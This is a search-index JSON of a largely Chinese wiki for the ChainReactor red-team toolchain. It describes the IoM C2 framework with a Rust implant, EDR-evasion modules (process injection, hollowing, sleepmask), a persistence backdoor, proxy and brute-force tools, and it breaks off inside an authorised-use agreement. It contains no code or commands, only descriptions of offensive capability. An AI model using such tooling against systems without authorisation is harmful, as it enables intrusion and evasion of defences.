{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"ChainReactor's Wiki","text":""},{"location":"#chainreactor","title":"ChainReactor","text":"<p>chainreactor \u4e13\u6ce8\u4e8e offensive security \u9886\u57df.</p> <p>\u4ee5\u7edf\u4e00\u7684\u8bbe\u8ba1\u98ce\u683c\u53bb\u91cd\u6784\u5404\u4e2a\u7ec6\u5206\u9886\u57df\"allinone\"\u5de5\u5177, \u53bb\u5b9e\u73b0\u4ee5\u4eba\u4e3a\u6838\u5fc3\u7684\u7ea2\u961f\u5de5\u5177\u94fe\u4e0e\u5de5\u7a0b\u5316\u5b9e\u8df5,  \u6211\u4eec\u5c06\u5176\u547d\u540d\u4e3a redboot .  \u6700\u7ec8\u8ba1\u5212\u5b9e\u73b0\u9762\u5411 \u9762\u5411\u7ea2\u961f \u7684 \u4e00\u4f53\u5316\u5e73\u53f0 ,\u63d0\u4f9b\u4e00\u6574\u5957\u5b8c\u6574\u7684 \u7ea2\u961f\u5de5\u7a0b\u57fa\u7840\u8bbe\u65bd . </p> <p>\u901a\u8fc7\u8fbe\u5230 \u4e34\u754c\u8d28\u91cf \u4ee5\u5b9e\u73b0\u5de5\u4ef6\u4e4b\u95f4\u7684 \u94fe\u5f0f\u53cd\u5e94\u3002</p>"},{"location":"#redboot-roadmap","title":"Redboot Roadmap","text":"<p>\u4e3a\u4e86\u8fbe\u6210\u6211\u4eec\u7684\u7ec8\u6781\u76ee\u6807. \u6211\u4eec\u7684\u84dd\u56fe\u4eceASM\u62d3\u5c55\u5230\u4e86C2\u6846\u67b6+\u6d41\u91cf\u63a7\u5236\u5de5\u4ef6+ASM\u6846\u67b6\u4e09\u4e2a\u90e8\u5206.  \u8fd9\u4e09\u4e2a\u9886\u57df\u5c06\u8986\u76d6\u653b\u51fb\u6a21\u62df\u6d41\u7a0b\u4e2d\u7684Pre-Exploit \u2194 Post-Exploit</p> <p>\u76ee\u524d\u6211\u4eec\u7684\u8ba1\u5212\u4e2d\u6709\u4e09\u6761\u94fe\u5f0f\u53cd\u5e94\u7684\u94fe\u8def, \u5206\u522b\u5bf9\u5e94\u4e86\u540e\u6e17\u900fIoM, \u524d\u6e17\u900f/\u4fe1\u606f\u6536\u96c6(mapping), \u4ee5\u53ca\u6253\u901aIoM\u4e0emapping\u7684\u6d41\u91cf\u5de5\u5177proxy</p>"},{"location":"#chain1-iom-\u5df2\u53d1\u5e03","title":"Chain1 IoM (\u5df2\u53d1\u5e03)","text":"<p>IoM(<code>Internet of Malice</code>) \u7684\u5b9a\u4f4d\u662f\u4e0b\u4e00\u4ee3C2\u6846\u67b6, \u540c\u6837\u4ee5\u9ad8\u5ea6\u6a21\u5757\u5316\u4e0e\u53ef\u62d3\u5c55\u6027\u4e3a\u6838\u5fc3\u8bbe\u8ba1\u7406\u5ff5. \u57fa\u4e8e\u8fd9\u4e2a\u7406\u5ff5\u53bb\u5b9e\u73b0\u63d2\u4ef6\u5316\u7684OPSEC, \u63d2\u4ef6\u5316\u7684\u793e\u533a\u751f\u6001, \u63d2\u4ef6\u5316\u7684\u4e00\u5207.</p> <p>\u66f4\u91cd\u8981\u7684\u662f, IoM\u5c06\u7ed3\u5408C2\u4e0ewebshell, \u5c06\u540c\u4e00\u5957\u63d2\u4ef6\u5316\u7684\u57fa\u5efa\u5171\u4eab\u7ed9\u5b8c\u5168\u4e0d\u540c\u7684\u540e\u6e17\u900f\u573a\u666f. </p> <p>IoM\u5df2\u7ecf\u53d1\u5e03v0.0.1, \u8fd9\u4e2a\u7248\u672c\u79bb\u6211\u4eec\u6700\u521d\u7684v0.0.1\u8bbe\u8ba1\u76ee\u6807\u8fd8\u6709\u5f88\u591a\u9057\u61be, \u4f46\u662f\u4e3a\u4e86\u9632\u6b62\u95ed\u95e8\u9020\u8f66, \u6211\u4eec\u60f3\u63d0\u524d\u4ece\u793e\u533a\u4e2d\u63a5\u6536\u53cd\u9988.</p> <p>update v0.0.4</p> <p>\u5df2\u7ecf\u53d1\u5e03v0.0.4, \u5b9e\u73b0\u4e86\u7ea6sliver\u768480%, cs\u768470%\u529f\u80fd, \u4e5f\u6709\u975e\u5e38sliver\u4e0ecs\u90fd\u6ca1\u6709\u7684\u529f\u80fd</p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86IoM\u7684\u8bbe\u8ba1\u6587\u6863\u4e0e\u7528\u6237\u624b\u518c ,\u53ef\u4ee5\u5728\u8fd9\u91cc\u4f53\u9a8c\u5230IoM\u7684v0.1.0</p>"},{"location":"#chain2-mapping","title":"Chain2 mapping","text":"<p>mapping \u9884\u8ba1\u57282024\u5e74\u5185\u53d1\u5e03</p> <p>ASM\u662fchainreactor\u7684\u521d\u8877, gogo/spray/zombie\u4e4b\u7c7b\u7684\u5de5\u5177\u5b9e\u9645\u4e0a\u90fd\u662f\u4e3a\u4e86\u8fd9\u4e2a\u76ee\u6807\u8bbe\u8ba1\u7684. \u901a\u8fc7\u6781\u9ad8\u7684\u62d3\u5c55\u6027\u4e0e\u7ec6\u7c92\u5ea6\u5b9e\u73b0\u7684\u5b8c\u5168\u53ef\u63a7\u7684\u653b\u51fb\u9762\u7ba1\u7406\u5f15\u64ce.</p> <p>\u73b0\u5728\u8fd9\u4e2a\u76ee\u6807\u5df2\u7ecf\u5b8c\u6210\u4e86v0.0.1, \u4f46\u56e0\u4e3a\u4e00\u4e9b\u6570\u636e\u6e90\u4e0e\u90e8\u7f72\u65b9\u5f0f\u7684\u95ee\u9898, \u6682\u65f6\u65e0\u6cd5\u53d1\u5e03. </p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86mapping\u7684\u8bbe\u8ba1\u6587\u6863, \u53ef\u4ee5\u5728\u8fd9\u91cc\u770b\u5230mapping\u4f5c\u4e3a\u7ea2\u961f\u5411\u7684\u534f\u4f5c\u5f0f\u653b\u51fb\u9762\u5f15\u64ce\u7684\u8bbe\u8ba1\u7406\u5ff5.</p>"},{"location":"#chain3-rem-\u5df2\u53d1\u5e03","title":"Chain3 rem (\u5df2\u53d1\u5e03)","text":"<p>rem\u662f\u5168\u573a\u666f\u7684\u6d41\u91cf/\u4ee3\u7406\u5de5\u5177. \u80fd\u7528\u6765\u89e3\u51b3\u7edd\u5927\u591a\u6570\u573a\u666f\u7684\u4ee3\u7406\u4e0e\u8f6c\u53d1\u9700\u6c42, \u4e5f\u7528\u6765\u6253\u901amapping\u4e0eIoM, \u8ba9mapping\u80fd\u901a\u8fc7rem+IoM\u63a5\u5165\u5185\u7f51. rem\u63d0\u4f9b\u4e86\u5728\u4f20\u8f93\u5c42, \u5e94\u7528\u5c42, \u52a0\u5bc6\u5c42, \u6df7\u6dc6\u5c42\u7684\u62d3\u5c55\u63a5\u53e3. \u53ef\u4ee5\u88ab\u8f7b\u677e\u4fee\u6539\u4e3a\u81ea\u5b9a\u4e49\u7279\u5f81, \u4e5f\u5c06\u662fIoM\u5728\u6d41\u91cf\u7aef\u7684\u80fd\u529b\u62d3\u5c55. </p> <p>\u76ee\u524d\u63d0\u4f9b\u4e86rem\u7684\u8bbe\u8ba1\u6587\u6863 \u4e0e\u793e\u533a\u7248 https://github.com/chainreactors/rem-community</p> <p>\u76ee\u524d\u8fd9\u4e09\u4e2athread\u90fd\u5df2\u7ecf\u5b8c\u6210\u4e86v0.0.1, \u5c06\u9010\u6b65\u53d1\u5e03.</p>"},{"location":"#\u53ef\u80fd\u4f1a\u5b58\u5728\u7684\u5546\u4e1a\u5316\u8ba1\u5212","title":"\u53ef\u80fd\u4f1a\u5b58\u5728\u7684\u5546\u4e1a\u5316\u8ba1\u5212","text":"<p>\u73b0\u5728redboot\u76f8\u5173\u7684\u9879\u76ee\u9010\u6e10\u4ece\u73a9\u7968\u6027\u8d28\u8f6c\u4e3a\u4e86\u4e3b\u4e1a. redboot\u51e0\u4e4e\u662f \u4e00\u4f53\u5316\u653b\u51fb\u5e73\u53f0 \u7684 \u7406\u60f3\u5f62\u6001 . \u56e0\u6b64, \u6211\u4eec\u8ba4\u4e3a\u8fd9\u4e2a\u8ba1\u5212\u5b58\u5728\u5546\u4e1a\u5316\u7684\u6f5c\u529b.</p> <p>\u5982\u679c\u60a8\u6709 \u84dd\u519b\u57fa\u7840\u8bbe\u65bd\u5efa\u8bbe \uff0c\u7ea2\u961f\u670d\u52a1\uff0cBAS\u57fa\u7840\u8bbe\u65bd \u7684\u9700\u6c42\uff0c \u6b22\u8fce\u4e0e\u6211\u4eec\u8054\u7cfb\u3002</p> Mail <p>m09ician@gmail.com</p>"},{"location":"#\u63a5\u53d7\u5b9a\u5236\u5316\u548c\u91c7\u8d2d\u7684\u5de5\u5177","title":"\u63a5\u53d7\u5b9a\u5236\u5316\u548c\u91c7\u8d2d\u7684\u5de5\u5177","text":"<ul> <li>morefingers , \u989d\u5916\u5305\u542b\u4e86\u7ea650000\u6761\u6307\u7eb9\u89c4\u5219(\u4e0efingers\u81ea\u5e26\u7684\u6709\u91cd\u590d), \u53ef\u65e0\u7f1d\u63a5\u5165fingers</li> <li>IoM, \u76ee\u524d\u53d1\u5e03\u4e86v0.0.4, \u4e0b\u4e00\u4ee3C2\u6846\u67b6, \u6b63\u5728\u5feb\u901f\u5f00\u53d1\u8fed\u4ee3, \u6b22\u8fce\u63d0\u4f9b\u9700\u6c42\u548c\u5b9a\u5236\u5316\u8981\u6c42</li> <li>rem \u80fd\u5b9e\u73b0\u4e00\u5207\u4ee3\u7406/\u6d41\u91cf\u4fa7\u7684\u9700\u6c42</li> </ul>"},{"location":"#toolchain","title":"ToolChain","text":"<p>chainreactor \u5e76\u975e\u5728\u5404\u4e2a\u9886\u57df\u91cd\u65b0\u9020\u8f6e\u5b50, chainreactor \u5c06\u4f1a\u5728\u5404\u4e2a\u7ec6\u5206\u9886\u57df\u6df1\u5165\u63a2\u7d22, \u4ee5\u5de5\u4ef6\u5316\u7684\u89c6\u89d2\u5b9a\u4e49\u4e0b\u4e00\u4ee3\u7684\u5de5\u5177. \u5de5\u5177\u94fe\u5c06\u4f5c\u4e3a3\u4e2aThreads\u7684\u57fa\u672c\u7c92\u5b50\u8d4b\u80fd\u5404\u4e2a\u7ec6\u5206\u9886\u57df. </p> <p>\u6ca1\u6709\u6dfb\u52a0\u8d85\u94fe\u63a5\u7684\u4e3a\u6682\u672a\u516c\u5f00\u7684\u9879\u76ee</p>"},{"location":"#artifact","title":"Artifact","text":"<p>chainreactor \u81ea\u7814\u7684\u5de5\u5177\u94fe</p> <ul> <li>gogo \u9762\u5411\u7ea2\u961f\u7684\u81ea\u52a8\u5316\u5f15\u64ce</li> <li>spray \u4e0b\u4e00\u4ee3\u76ee\u5f55\u7206\u7834\u5de5\u5177</li> <li>urlfounder \u88ab\u52a8 url \u6536\u96c6\u5de5\u5177</li> <li>zombie \u670d\u52a1/\u534f\u8bae\u4e0b\u4e00\u4ee3\u7206\u7834\u5de5\u5177</li> <li>searcher \u7a7a\u95f4\u5f15\u64ce\u4ea4\u53c9\u9012\u5f52\u722c\u866b (Private)</li> <li>ani \u4f01\u4e1a\u4fe1\u606f\u722c\u866b (Private)</li> <li>found \u57fa\u4e8enuclei-templates\u7684\u914d\u7f6e\u5316\u7684\u672c\u5730\u654f\u611f\u4fe1\u606f\u6536\u96c6\u5de5\u5177 (WIP)</li> <li>meta-matrix \u4e91\u51fd\u6570\u5316\u6846\u67b6 (Private)</li> </ul>"},{"location":"#lib","title":"Lib","text":"<p>\u57fa\u7840\u8bbe\u65bd\u5e93</p> <ul> <li>words , \u4f7f\u7528 go \u91cd\u5199\u4e86 hashcat \u4e2d\u7684 mask/rule \u5b57\u5178\u751f\u6210\u5668, \u5e76\u6dfb\u52a0\u4e86\u4e00\u4e9b\u65b0\u529f\u80fd</li> <li>templates  \u5de5\u5177\u94fe\u5404\u7c7b\u914d\u7f6e\u5e93, \u5305\u62ec\u6307\u7eb9, \u654f\u611f\u4fe1\u606f, poc, \u5b57\u5178, \u7aef\u53e3\u7b49\u7b49</li> <li>neutron \u4f7f\u7528\u7eaf go \u5b9e\u73b0\u5e76\u53bb\u6389\u51e0\u4e4e\u5168\u90e8\u7b2c\u4e09\u65b9\u4f9d\u8d56\u7684\u8f7b\u91cf\u7ea7 nuclei \u5f15\u64ce, \u53ef\u4ee5\u65e0\u526f\u4f5c\u7528\u7684\u96c6\u6210\u5230\u4efb\u610f\u5de5\u5177\u4e2d\u800c\u4e0d\u4f1a\u7834\u574f\u7cfb\u7edf\u517c\u5bb9\u6027. \u4e5f\u51e0\u4e4e\u4e0d\u4f1a\u5e26\u6765\u989d\u5916\u7684\u4f9d\u8d56.</li> <li>fingers  templates, wappalyzer, fingerprinthub\u7b49\u6307\u7eb9\u5e93\u7684go\u5b9e\u73b0,  \u652f\u6301\u81ea\u5b9a\u4e49\u6dfb\u52a0\u5404\u7c7b\u7b2c\u4e09\u65b9\u6307\u7eb9\u5e93</li> <li>proxyclient golang\u98ce\u683c\u7684proxy\u5ba2\u6237\u7aef, \u652f\u6301http/https, socks5/socks4/socks4a, ssh\u7b49\u4ee3\u7406</li> <li>parsers, \u5c01\u88c5\u4e86 chainreactor \u5de5\u5177\u94fe\u4e0a\u7684\u5404\u4e2a\u5de5\u5177\u8f93\u5165\u8f93\u51fa\u7684\u89e3\u6790\u76f8\u5173\u7684\u4ee3\u7801.</li> <li>mals \u57fa\u4e8elua\u5b9e\u73b0\u7684\u63d2\u4ef6\u5f15\u64ce</li> <li>crtm \u57fa\u4e8epdtm\u4fee\u6539\u7684chainreactor\u5305\u7ba1\u7406\u5de5\u5177. </li> <li>picker \u5c06repo\u53d8\u6210RSS\u8ba2\u9605,\u6587\u7ae0\u6574\u7406\u5f52\u6863, \u8ba8\u8bba\u7684\u793e\u533a</li> <li>wiki chainreactors \u6587\u6863\u5e93Markdown</li> </ul>"},{"location":"#other","title":"Other","text":"<p>\u6211\u4eec\u5c06\u6beb\u65e0\u4fdd\u7559\u7684\u516c\u5f00\u6211\u4eec\u7684\u8bbe\u8ba1\u7406\u5ff5\u4e0e\u5404\u79cd\u5b9e\u8df5\u4e2d\u79ef\u7d2f\u7684\u7ecf\u9a8c, \u4e5f\u6b22\u8fce\u793e\u533a\u63d0\u4f9b\u66f4\u591a\u7684\u610f\u89c1, \u7ecf\u9a8c\u4ee5\u53ca PR. </p> <p>\u6211\u4eec\u7684\u7edd\u5927\u90e8\u5206\u5de5\u5177\u5c06\u4f1a\u4fdd\u6301\u5f00\u6e90, \u4e3a\u793e\u533a\u63d0\u4f9b\u4e00\u4e2a\u5f00\u6e90\u7684\u9009\u9879, \u5e76\u5728\u57fa\u4e8e\u5f00\u6e90\u5c1d\u8bd5\u5bfb\u627e\u5546\u4e1a\u5316\u8def\u7ebf, \u4e0d\u8fc7\u4e3a\u4e86\u907f\u514d\u6709\u53ef\u80fd\u7684\u4e89\u8bae, \u6211\u4eec\u7684\u5f00\u6e90\u534f\u8bae\u4e0d\u4f1a\u9009\u62e9\u5546\u4e1a\u5316\u53cb\u597d\u7684\u534f\u8bae, \u53ea\u5bf9\u4e2a\u4eba\u4f7f\u7528\u8005\u4fdd\u6301\u5b8c\u5168\u7684\u5f00\u653e.</p> <p>\u90e8\u5206\u5de5\u5177\u6b63\u5728\u5f00\u53d1\u4e2d, \u975e\u5e38\u591a\u529f\u80fd\u6ca1\u6709\u5b9e\u73b0, \u4e5f\u9700\u8981\u5145\u5206\u7684\u6d4b\u8bd5\u624d\u80fd\u516c\u5f00, \u6240\u4ee5\u6682\u65f6\u53ea\u5bf9\u8d21\u732e\u8005\u5f00\u653e\u8bd5\u7528.</p> <p>\u63a5\u4e0b\u6765\u4e00\u6bb5\u65f6\u95f4, \u6211\u4eec\u5c06\u4f1a\u53d1\u5e03\u4e00\u90e8\u5206\u81ea\u8ba4\u4e3a\u65f6\u673a\u76f8\u5bf9\u6210\u719f\u7684\u5de5\u4ef6, \u5e76\u4ecb\u7ecd\u8bbe\u8ba1\u8fc7\u7a0b\u4e2d\u7684\u4e00\u4e9b\u5947\u601d\u5999\u60f3\u4e0e\u5b9e\u6218\u4e2d\u9762\u4e34\u7684\u95ee\u9898.</p>"},{"location":"IoM/","title":"Internet of Malice \u00b7 index","text":""},{"location":"IoM/#overview","title":"Overview","text":"<p>Internet of Malice(\u6076\u8054\u7f51) \u529b\u56fe\u5b9e\u73b0\u4e00\u5957\u5f00\u6e90 Offensive \u57fa\u7840\u8bbe\u65bd, \u517c\u5bb9CS,MSF,Sliver\u751f\u6001, \u63d0\u4f9b\u66f4\u9ad8\u7684\u62d3\u5c55\u6027\u4e0e\u9690\u853d\u6027, \u5e76\u63d0\u4f9b\u5b8c\u6574\u7684\u5de5\u7a0b\u5316\u89e3\u51b3\u65b9\u6848\u3002 IoM\u5c06\u4f5c\u4e3a\u8fdb\u653b\u6027\u57fa\u7840\u8bbe\u65bd\u5b9e\u73b0\uff0c \u800c\u4e0d\u4ec5\u4ec5\u662f\u4e00\u4e2aC2\u5de5\u5177\uff0c \u4f60\u80fd\u5728\u8fd9\u91cc\u627e\u5230\u5148\u8fdb\u7684\u8bbe\u8ba1\u7406\u5ff5\u3001\u5de5\u7a0b\u5316\u5b9e\u73b0\u3001\u63d2\u4ef6\u751f\u6001\u4ee5\u53ca\u80fd\u7528\u4e8eReal World\u7684\u89e3\u51b3\u65b9\u6848\u3002</p> <p>Offensive \u57fa\u7840\u8bbe\u65bd\u662f\u6bd4\u5176\u4ed6\u9886\u57df\u66f4\u5177\u6311\u6218\u6027, \u4e0d\u7ba1\u5728\u8bbe\u8ba1\u4e0a\u8fd8\u662f\u5b9e\u73b0\u4e0a\u90fd\u66f4\u4e3a\u590d\u6742\u3002</p> <p>\u6211\u4eec\u8ba1\u5212\u5728\u5b9e\u73b0\u7b2c\u4e00\u9636\u6bb5\u529f\u80fd\u540e, \u53d1\u5e03IoM-community v0.0.1 \u4f5c\u4e3a\u9884\u89c8\u7248\u672c.</p> <p>\u76ee\u524d\u5df2\u7ecf\u53d1\u5e03v0.0.2\u79bb\u8bbe\u8ba1\u76ee\u6807\u7684\u5b8c\u5168\u4f53\u5f62\u6001\u8fd8\u6709\u8f83\u5927\u7684\u8ddd\u79bb. </p> <p>v0.0.3 \u5df2\u7ecf\u5b9e\u73b0\u6211\u4eec\u6700\u521d\u8bbe\u8ba1\u76ee\u6807\u7684\u5927\u90e8\u5206\u529f\u80fd, \u5e76\u4e14\u53ef\u4ee5\u8bf4\u662f\u5f00\u6e90\u793e\u533a\u4e2d\u6700\u5f3a\u5927\u7684C2\u4e86. \u5e76\u4e14\u6211\u4eec\u6709\u4e86\u5927\u7684\u91ce\u5fc3. IoM\u81f4\u529b\u4e8e\u6210\u4e3a\u5f00\u653e\u7684\u7ea2\u961f\u57fa\u7840\u8bbe\u65bd</p> <p>v0.0.4 \u4fee\u590d\u4e86\u4e0a\u4e2a\u7248\u672c\u7559\u4e0b\u7684\u9057\u61be\uff0c \u5c06\u517c\u5bb9\u6027\u62d3\u5c55\u5230rust\u751f\u6001\u7684\u6bcf\u4e2a\u89d2\u843d\uff1b \u5e76\u4e14\u901a\u8fc7github action\u6781\u5927\u7b80\u5316\u4e86\u7f16\u8bd1\u590d\u6742\u5ea6\uff1b\u5b8c\u5584\u4e86\u591a\u6bb5\u52a0\u8f7d\u7684\u5b9e\u73b0\u3002 </p> <p>v0.1.0 \u6211\u4eec\u8865\u5168\u4e86\u4f5c\u4e3a\u4e00\u4e2a\u73b0\u4ee3C2\u7684\u6240\u6709\u529f\u80fd\uff0cGUI\u3001\u4ee3\u7406\u3001OPSEC\u3001\u63d2\u4ef6\u3002\u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u5f88\u81ea\u8c6a\u7684\u8bf4\uff0c</p> <p>v0.1.1\u6781\u5927\u7b80\u5316\u4e86IoM\u7684\u4e0a\u624b\u96be\u5ea6\uff0c\u5927\u5e45\u5ea6\u63d0\u5347\u4e86\u7528\u6237\u4f53\u9a8c\u3002\u6211\u4eec\u5e76\u4e0d\u5e0c\u671bIoM\u7684\u4f7f\u7528\u4f53\u9a8c\u8ba9\u4e13\u4e1a\u4eba\u5458\u90fd\u671b\u800c\u751f\u754f\uff0c \u800c\u662f\u80fd\u8ba9\u4e0d\u8bba\u662f\u5927\u4f6c\u8fd8\u662f\u65b0\u624b\u90fd\u80fd\u5f97\u5230\u826f\u597d\u7684\u7528\u6237\u4f53\u9a8c\u3002 IoM \u5df2\u7ecf\u662f\u76ee\u524d\u6240\u6709\u5f00\u6e90C2\u4e2d\uff0c\u652f\u6301\u529f\u80fd\u6700\u5168\u3001 \u53ef\u62d3\u5c55\u80fd\u529b\u6700\u4e30\u5bcc\u3001OPSEC\u6700\u5f3a\u3001\u5de5\u7a0b\u5316\u6700\u5b8c\u5584\u7684\u73b0\u4ee3\u5316C2\uff0c \u6ca1\u6709\u4e4b\u4e00\u3002</p> <p>\u53d7\u9650\u4e8e\u5f00\u53d1\u8fdb\u5ea6, \u6211\u4eec\u51b3\u5b9a\u5148\u63a5\u53d7\u6765\u81ea\u793e\u533a\u7684\u610f\u89c1, \u95ed\u95e8\u9020\u8f66\u9020\u4e0d\u51fa\u6700\u5148\u8fdb\u7684\u5de5\u5177.</p> <p>Features.</p> <ul> <li>rust\u7f16\u5199\u7684implant, \u5b9e\u73b0\u5168\u5e73\u53f0\u517c\u5bb9</li> <li>\u5206\u5e03\u5f0f\u72ec\u7acb\u90e8\u7f72\u7684listener</li> <li>\u652f\u6301\u6b63\u5411\u4e0e\u53cd\u5411\u94fe\u63a5\u7684implant</li> <li>\u4e13\u6ce8\u4e8eOPSEC</li> <li>everything is fileless</li> <li>\u63d2\u4ef6\u517c\u5bb9, \u517c\u5bb9cobaltstrike\u7684BOF\u4e0esliver\u7684armory\u793e\u533a\u751f\u6001\u7b49\u7b49</li> <li>\u63d2\u4ef6\u751f\u6001, \u901a\u8fc7lua\u4e0eyaegi\u5b9e\u73b0\u4e86\u4e00\u4e2a\u80fd\u52a8\u6001\u52a0\u8f7d\u7684mal\u63d2\u4ef6\u751f\u6001</li> <li>\u81ea\u7531\u7ec4\u88c5, implant\u7684\u6240\u6709\u6a21\u5757\u90fd\u53ef\u4ee5\u5728\u7f16\u8bd1\u65f6\u81ea\u7531\u7ec4\u88c5</li> <li>\u70ed\u63d2\u62d4, implant\u7684\u6240\u6709\u6a21\u5757\u90fd\u53ef\u4ee5\u52a8\u6001\u8f7d\u5165, \u4e0d\u9700\u8981\u91cd\u65b0\u7f16\u8bd1, \u4e0d\u9700\u8981\u91cd\u542f\u8fdb\u7a0b</li> <li>\u63d2\u4ef6\u5316, client,server,implant\u90fd\u5c06\u4fdd\u7559\u5927\u91cf\u63d2\u4ef6\u63a5\u53e3, \u81f4\u529b\u4e8e\u5b9e\u73b0cobaltstrike\u540c\u6837\u7684\u81ea\u7531\u5ea6</li> </ul>"},{"location":"IoM/#introduce","title":"Introduce","text":"<p>IoM\u67b6\u6784\u4e0e\u8bbe\u8ba1</p>"},{"location":"IoM/#\u5feb\u901f\u5165\u95e8","title":"\u5feb\u901f\u5165\u95e8","text":"<p>\u5feb\u901f\u5f00\u59cb\uff0c\u5f00\u7bb1\u5373\u7528</p>"},{"location":"IoM/#\u67b6\u6784architecture","title":"\u67b6\u6784/architecture","text":"<p>IoM\u5c06\u7531\u4e00\u7cfb\u5217\u4ed3\u5e93\u7ec4\u6210</p> <ul> <li>WIP \ud83d\udee0\ufe0f \u8868\u793a\u5c06\u4f1a\u5b9e\u73b0; </li> <li>Private \ud83d\udd12 \u8868\u793a\u5df2\u5b9e\u73b0\u4f46\u4e0d\u5b8c\u5584\u8fd8\u9700\u8981\u8c03\u6574\u56e0\u6682\u672a\u516c\u5f00, \u4f46\u5728\u53d1\u5e03\u8ba1\u5212\u4e2d</li> <li>Professional \ud83d\udc64 \u8868\u793a\u9700\u8981\u989d\u5916\u5ba1\u6838\u7684\u7528\u6237\u53ef\u8bbf\u95ee</li> </ul> <p>\u6587\u6863\u4e2d\u80fd\u89c1\u5230\u7684\u6ca1\u6709\u6dfb\u52a0 \ud83d\udee0\ufe0f, \ud83d\udd12 ,  \ud83d\udc64 \u6807\u8bb0\u7684\u5185\u5bb9\u4e3a\u5df2\u7ecf\u5f00\u6e90\u7684</p> <p>\u5b9e\u9645\u4e0aserver, client, listener, implant\u5747\u5df2\u5b8c\u5168\u5f00\u6e90, \u53ea\u6709implant\u7684\u4e00\u90e8\u5206\u7ec4\u4ef6\u56e0\u4e3a\u5bf9\u6297\u7684\u539f\u56e0\u4e0d\u80fd\u5b8c\u5168\u5f00\u6e90, \u4ee5lib\u7684\u65b9\u5f0f\u63d0\u4f9b. \u4e0d\u5f71\u54cd\u7f16\u8bd1, \u4f7f\u7528, \u4e8c\u5f00.</p> <p>\u4e3b\u4f53\u6846\u67b6</p> <ul> <li>server+client+listener: https://github.com/chainreactors/malice-network</li> <li>implant: https://github.com/chainreactors/malefic</li> <li>\u901a\u8baf\u534f\u8bae(protobuf): https://github.com/chainreactors/proto</li> <li>\u63d2\u4ef6\u4ed3\u5e93 : mals<ul> <li>\u793e\u533a\u7248\u9ed8\u8ba4\u63d2\u4ef6\u5305: mal-community</li> </ul> </li> <li>\u6d41\u91cf\u4e0e\u4ee3\u7406: https://github.com/chainreactors/rem-community </li> </ul> <p>kits \u662f\u4e00\u4e9b\u4e13\u6ce8\u4e8eopsec\u4e0eedr\u5bf9\u6297\u7684\u63d2\u4ef6\u5305\u6216\u5404\u7c7b\u5c0f\u7ec4\u4ef6, \u4f5c\u4e3aIoM\u7684\u9644\u52a0\u80fd\u529b</p> <ul> <li>malefic-win-kit , windows\u7aef\u5de5\u5177\u5305, \u5305\u542bheadlessPE, sleepmask, \u8fdb\u7a0b\u6ce8\u5165, \u8fdb\u7a0b\u9542\u7a7a\u7b49\u7b49\u5173\u4e8eopsec\u7684\u6a21\u5757, \u53ef\u4ee5\u88abimplant\u70ed\u52a0\u8f7d (\ud83d\udc64)</li> <li>malefic-linux-kit (\ud83d\udee0\ufe0f)</li> <li>malefic-*os-kit (\ud83d\udee0\ufe0f)</li> <li>malefic-android-kit (\ud83d\udee0\ufe0f)</li> <li>mice (\ud83d\udd12), \u6301\u4e45\u6027\u540e\u95e8</li> </ul>"},{"location":"IoM/#\u66f4\u65b0\u65e5\u5fd7","title":"\u66f4\u65b0\u65e5\u5fd7","text":"<ul> <li>v0.0.1 next generation C2 project</li> <li>v0.0.2 the Real Beginning</li> <li>v0.0.3 RedTeam Infra&amp;C2 framework</li> <li>v0.0.4 Bootstrapping</li> <li>v0.1.0 \u4ee3\u66ffCobaltStrike\u7684\u6700\u540e\u56db\u5757\u788e\u7247</li> <li>v0.1.1 Out of the Box \u5f00\u7bb1\u5373\u7528</li> </ul> <p>Advanced Posts:</p> <ul> <li>PELoader&amp;RDI\u7684TLS\u4e4b\u6b87</li> </ul>"},{"location":"IoM/#\u793e\u533a","title":"\u793e\u533a","text":""},{"location":"IoM/#github","title":"github","text":"<p>malefic\u7684issues\u548cdisscussion \u5173\u4e8eimplant\u7684bug, \u7591\u60d1, \u9700\u6c42, \u5efa\u8bae\u90fd\u6b22\u8fce\u5728\u8be5\u9879\u76ee\u7684issue/disscussion\u4e2d\u8ba8\u8bba</p> <p>malice-network\u7684issues\u548cdisscussion \u5173\u4e8eclient/server\u7684bug, \u7591\u60d1, \u9700\u6c42, \u5efa\u8bae\u90fd\u6b22\u8fce\u5728\u8be5\u9879\u76ee\u7684issue/disscussion\u4e2d\u8ba8\u8bba</p> <p>\u516c\u5f00\u7684\u8ba8\u8bba\u66f4\u80fd\u5e2e\u52a9IoM\u6539\u8fdb\u81ea\u8eab</p> <p>\u5f53\u7136\u4e5f\u6709\u4e00\u4e9b\u4e0d\u4fbf\u516c\u5f00\u7684\u8ba8\u8bba, \u6b22\u8fce\u901a\u8fc7\u5fae\u4fe1\u7fa4\u6dfb\u79c1\u804a\u6211</p>"},{"location":"IoM/#\u5fae\u4fe1\u7fa4","title":"\u5fae\u4fe1\u7fa4","text":"<p>\u5982\u679c\u6709\u6df1\u5165\u8ba8\u8bba\u5173\u4e8eIoM\u7684\u95ee\u9898, \u66f4\u5efa\u8bae\u5728github\u7684issues/disscussion\u4e2d\u8fdb\u884c, \u5fae\u4fe1\u7fa4\u4e00\u822c\u53ea\u7528\u6765\u5e7f\u64ad\u66f4\u65b0\u8fdb\u5ea6. </p> <p>\u5fae\u4fe1\u7fa4\u5df2\u8d85\u8fc7200\u4eba, \u53ef\u4ee5\u901a\u8fc7 m09ician@gmail.com \u53d1\u9001\u90ae\u4ef6, \u4f1a\u5b9a\u671f\u62c9\u4eba\u5165\u7fa4</p>"},{"location":"IoM/#\u7528\u6237\u534f\u8bae","title":"\u7528\u6237\u534f\u8bae","text":"<p>1. \u6388\u6743\u4f7f\u7528\u8303\u56f4</p> <p>\u672c\u5de5\u5177\u65e8\u5728\u4fc3\u8fdb\u7f51\u7edc\u5b89\u5168\u6280\u672f\u7814\u7a76\uff0c\u7528\u6237\u5e94\u5728\u7b26\u5408\u4ee5\u4e0b\u6761\u4ef6\u7684\u573a\u666f\u4e2d\u4f7f\u7528\uff1a</p> <ul> <li> <p>\u83b7\u5f97\u76ee\u6807\u7cfb\u7edf\u6240\u6709\u8005\u7684 \u4e66\u9762\u6388\u6743 \uff1b</p> </li> <li> <p>\u5b66\u672f\u673a\u6784\u6216\u4f01\u4e1a\u5728 \u53ef\u63a7\u73af\u5883 \u4e2d\u7684\u9632\u5fa1\u80fd\u529b\u9a8c\u8bc1\uff1b</p> </li> <li> 